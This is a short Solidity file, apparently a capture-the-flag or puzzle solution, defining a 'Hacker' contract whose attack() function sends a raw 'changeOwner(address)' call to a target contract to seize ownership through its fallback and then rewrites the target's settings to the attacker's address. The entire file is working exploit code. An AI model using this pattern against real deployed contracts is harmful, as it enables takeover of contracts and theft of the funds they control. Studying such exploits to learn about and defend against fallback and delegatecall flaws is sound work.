pragma solidity 0.8.13;

import "hardhat/console.sol";

interface IRestrictedOwner {
    function callFallbalk(bytes calldata data) external;

    function updateSettings(address, address) external;
}

contract Hacker {
    IRestrictedOwner restricted;
    address public owner;

    constructor(address _restricted) {
        restricted = IRestrictedOwner(_restricted);
        owner = msg.sender;
    }

    function attack() external {
        bytes memory dataToSend = abi.encodeWithSignature(
            "changeOwner(address)",
            address(this)
        );

        (bool success, bytes memory data) = address(restricted).call(
            dataToSend
        );
        require(success, string(data));

        restricted.updateSettings(owner, owner);
    }
}
